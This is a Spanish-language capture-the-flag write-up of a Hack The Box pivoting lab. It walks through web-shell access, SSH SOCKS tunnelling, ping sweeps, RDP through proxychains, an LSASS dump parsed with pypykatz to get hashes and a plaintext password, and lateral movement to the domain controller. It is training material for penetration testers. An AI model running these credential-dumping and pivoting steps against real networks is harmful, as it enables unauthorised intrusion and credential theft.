
# Pivoting: Skills Assessment

## Escenario

Un miembro del equipo inició una prueba de penetración en el entorno de Inlanefreight, pero fue trasladado a otro proyecto en el último minuto. Afortunadamente para nosotros, dejaron un `web shell`para que podamos regresar a la red y poder continuar donde lo dejaron. Necesitamos aprovechar el shell web para continuar enumerando los hosts, identificando servicios comunes y usando esos servicios/protocolos para acceder a las redes internas de Inlanefreight.&#x20;

<figure><img src="/files/chEUUmoss9PQEAmySDIE" alt=""><figcaption></figcaption></figure>

Nuestros objetivos están detallados abajo:

***

### Objetivos

* Comience desde externo ( `máquina de atacante`) y acceda al primer sistema a través del webshell.
* Utilice el acceso al shell web para enumerar y pasar a un host interno.
* Continúe enumerando y pivotando hasta llegar a `Inlanefreight Domain Controller` y capturar el asociado `flag`.
* Utilice cualquier `dato`, `credencial`, `script` u otra información dentro del entorno para permitir sus intentos de pivote.
* Recopila todas las `flags` que se puedan encontrar.

{% hint style="info" %}
**Nota:** Ten en cuenta las herramientas y tácticas que practicamos a lo largo de este módulo. Cada uno puede proporcionar una ruta diferente hacia el siguiente punto de pivote. Es posible que el salto desde un conjunto de hosts le resulte sencillo, pero es posible que esa misma táctica no funcione para llegar al siguiente. Mientras completa esta evaluación de habilidades, recomendamos que tomes notas, dibujes un mapa de lo que ya sabes y planifiques tu próximo salto. Intentar hacerlo sobre la marcha resultará dificil sin tener una referencia visual.
{% endhint %}

***

### Información de conexión

`Foothold`: 10.129.201.127

Encontrará el shell web que se muestra a continuación cuando busque `support.inlanefreight.local` o la IP de destino arriba.

![texto](https://academy.hackthebox.com/storage/modules/158/webshell.png)

***

## <mark style="color:purple;">Empieza la prueba</mark>

Una vez en el servidor web, enumera el host para obtener las credenciales que se pueden usar para iniciar un pivoting o un túnel hacia otro host en la red. ¿En qué directorio de usuario puedes encontrar las credenciales? Envíe el nombre del usuario como respuesta.

### Accedemos a la webshell

<figure><img src="/files/l2ukTG9pG0nTMESQ2AOx" alt=""><figcaption></figcaption></figure>

* Encontramos 2 usuarios administradores:

```
administrator
webadmin
```

En la carpeta de webadmin encontramos un `id_rsa` que podríamos usar para conectarnos por SSH:

<figure><img src="/files/GClHcdfnvSiQXTSID1vb" alt=""><figcaption></figcaption></figure>

Nos los vamos a copiar a nuestra máquina de atacante. Al crackear el `id_rsa` buscando la contraseña en plano parece que no tiene contraseña

```
ssh2john id_rsa > ssh.hash          
id_rsa has no password!
```

También obtenemos información del nombre del servidor objetivo, un nombre de usuario y contraseña:

<figure><img src="/files/MBu3JdqvI3xzrzR81eoa" alt=""><figcaption></figcaption></figure>

### Ver interfaces de red

<figure><img src="/files/q3DT5QJ3Yy8cbJTrm5Oz" alt=""><figcaption></figcaption></figure>

Como tenemos conectividad y acciones limitadas por la webshell, vamos a conectarnos por SSH, lo que nos dará mayor libertad para realizar acciones.

### Acceso por SSH con id\_rsa

* Le damos los permisos correctos al id\_rsa:

```shell-session
afsh4ck@kali$ chmod 700 id_rsa
```

* Habilitamos el Port Forwarding por el puerto 9050 (el que usa proxychains por defecto)

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ ssh -D 9050 -i id_rsa webadmin@10.129.229.129  
</strong></code></pre>

{% hint style="warning" %}
**Nota**: Esta paso es fundamental para poder conectarnos posteriormente al host
{% endhint %}

```shell-session
webadmin@inlanefreight:~$ ls
for-admin-eyes-only  id_rsa

webadmin@inlanefreight:~$ ls -la
total 40
drwxr-xr-x 4 webadmin webadmin 4096 Feb 21 09:27 .
drwxr-xr-x 4 root     root     4096 Feb 21 09:27 ..
-rw------- 1 webadmin webadmin 1372 Feb 21 08:22 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 May  6  2022 .bashrc
drwx------ 2 webadmin webadmin 4096 Feb 21 09:27 .cache
-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
drwx--x--x 2 webadmin webadmin 4096 Feb 21 09:27 .ssh
-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
-rw-r--r-- 1 root     root     2622 May 16  2022 id_rsa
```

Conseguimos acceder correctamente al servidor y leemos el archivo `.bash_history` (que no podíamos leer desde la webshell), buscando alguna pista de cómo seguir avanzando:

```shell-session
webadmin@inlanefreight:~$ cat .bash_history 
ls
pwd
ls -la
history
ls
status ufw
netstat -tulnp
<------SNIP------>
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
ls
chmod +x backupjob 
./backupjob 
exit
```

Encontramos un `for loop` que hace un `ping sweep`, lo que nos sirve para descubrir redes internas. Solamente lo copiamos y lo ejecutamos en la terminal directamente:

```shell-session
webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.535 ms
```

Descubrimos que hay 2 hosts en la red:

```powershell
172.16.5.15.  # La máquina actual
172.16.5.35 --> Nuevo host descubierto
```

### Conexión por RDP al nuevo host

Con proxychains apuntando al nuevo host descubierto y las credenciales que descubrimos antes:

```
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

Nos conectamos correctamente y obtenemos la flag en C:\ 🏆

<figure><img src="/files/9dRpsxFBt6jkbrrh3g7B" alt=""><figcaption></figcaption></figure>

### Ver interfaces de red y Ping Sweep

<figure><img src="/files/n4MfWYY7kKIVxsIf0fk7" alt=""><figcaption></figcaption></figure>

Dado que las interfaces de red internas son `172.16.5.35` y `172.16.6.35`, podemos realizar un ping sweep en ambas subredes (`172.16.5.0/24` y `172.16.6.0/24`). Vamos a crear un script de PowerShell para escanear ambas subredes.

```powershell
# Define las subredes a escanear
$subnets = @("172.16.5", "172.16.6")

# Rango de IPs a escanear
$startRange = 1
$endRange = 254
$totalIPs = ($endRange - $startRange + 1) * $subnets.Count
$currentIP = 0

# Almacena los resultados
$result = @()

# Mostrar mensaje de inicio de escaneo
Write-Output "Escaneando redes..."

# Realiza el ping sweep para cada subred
foreach ($subnet in $subnets) {
    for ($i = $startRange; $i -le $endRange; $i++) {
        $ip = "$subnet.$i"
        $ping = Test-Connection -ComputerName $ip -Count 1 -Quiet
        if ($ping) {
            $result += $ip
            Write-Output "$ip is up"
        }
        
        # Actualiza el progreso
        $currentIP++
        $progress = [math]::Round(($currentIP / $totalIPs) * 100, 2)
        Write-Progress -Activity "Escaneando..." -Status "$progress% completado" -PercentComplete $progress
    }
}

# Muestra solo las IPs que están 'up'
Write-Output "Escaneo completado. IPs activas encontradas:"
$result
```

Lo guardamos como un archivo `PingSweep.ps1` y lo ejecutamos desde powershell:

{% hint style="info" %}
**Nota**: Este tipo de ping sweep puede tardar un poco, ya que estamos escaneando 2 rangos completos de red.
{% endhint %}

<figure><img src="/files/EwDP8TKmyvEv3J2THbU7" alt=""><figcaption></figcaption></figure>

En principio no encontramos nuevas subredes a las que podamos pivotar.

En pentests anteriores contra Inlanefreight, hemos visto que tienen la mala costumbre de utilizar cuentas con servicios de una manera que expone las credenciales de los usuarios y la red en su conjunto. ¿Qué usuario es vulnerable?

### Ver usuarios del sistema

<figure><img src="/files/6S8yY6xoDJsRdRqldFl6" alt=""><figcaption></figcaption></figure>

Vamos a hacer un dump de LSASS para extraer credenciales de los usuarios:

<figure><img src="/files/MhjDdcph8aj2FWohgEsO" alt=""><figcaption></figcaption></figure>

El archivo de volcado se guarda en:

```
C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
```

<figure><img src="/files/ihee8nKd3jUvO8A5vtDp" alt=""><figcaption></figcaption></figure>

### Envio de lsass.DMP a nuestra máquina de atacante

Nos vamos a volver a conectar por RDP pero creando una carpeta compartida añadiendo lo siguiente:

```shell-session
afsh4ck@kali$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert:ignore +drive:smbfolder,/home/kali/Descargas
```

<figure><img src="/files/xT5AqJU6tHmWd5UhnAQB" alt=""><figcaption></figcaption></figure>

### Extracción de credenciales con Pypykatz

Ahora que tenemos el archivo lsass.DMP en nuestra máquina de atacante, vamos a usar pypykatz para extraer todas las credenciales/hashes de los usuarios:

```shell-session
afsh4ck@kali$ pypykatz lsa minidump /home/kali/Descargas/lsass.DMP
```

```
 Username: mlefay
		Domain: PIVOT-SRV01
		LM: NA
		NT: 2831bf1e4e0841d882328d5481fb5c92
		SHA1: ccb38ae19c47a04fa01542f30466d6c48ddc18d7
		
 Username: vfrank
		Domain: INLANEFREIGHT
		LM: NA
		NT: 2e16a00be74fa0bf862b4256d0347e83
		SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
		DPAPI: 97ead6d940822b2c57b18885ffcc5fb4
== Kerberos ==
		Username: vfrank
		Domain: INLANEFREIGHT.LOCAL
		Password: Imply wet Unmasked!
		password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
		
Username: PIVOT-SRV01$
		Domain: INLANEFREIGHT
		LM: NA
		NT: 21ce18b1a025d4b0b01c0e716e99d476
		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
		
```

Vamos a conectarnos por RDP a la IP `172.16.6.35` con las siguientes credenciales:

```
Username: vfrank
Password: Imply wet Unmasked!
```

<figure><img src="/files/Skb1YjZBAQO2N6K108os" alt=""><figcaption></figcaption></figure>

Una vez dentro vamos a hacer un ping sweep de nuevo para buscar subredes:

{% hint style="warning" %}
**IMPORTANTE**: Tiene que ser desde una CMD, no desde PowerShell
{% endhint %}

{% code title="En una CMD" %}

```powershell
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"

C:\Users\vfrank>ping 172.16.6.25 -n 1 -w 100   | find "Reply" 
Reply from 172.16.6.25: bytes=32 time=1ms TTL=128     

C:\Users\vfrank>ping 172.16.6.35 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128

C:\Users\vfrank>ping 172.16.6.45 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.45: bytes=32 time=1ms TTL=64
```

{% endcode %}

Encontramos 3 subredes a las que vamos a probar a conectarnos con las mismas credenciales:

```powershell
172.16.6.25 --> Nueva máquina descubierta
172.16.6.35   # La máquina en la que estamos
172.16.6.45 --> Nueva máquina descubierta
```

Nos conectamos a la `172.16.6.25` y buuuum! Accedemos sin problema y obtenemos la flag 🏆

<figure><img src="/files/zUFVP2UXtRpKAIS82UKK" alt=""><figcaption></figcaption></figure>

Además observamos que tiene conectividad directa con el DC, por lo que podemos ver los archivos que contiene, incluido la flag final 🏆

<figure><img src="/files/z3aghZachBp3warwV4MX" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/WcLSjS9HFZA1p9zfXI1D" alt=""><figcaption></figcaption></figure>
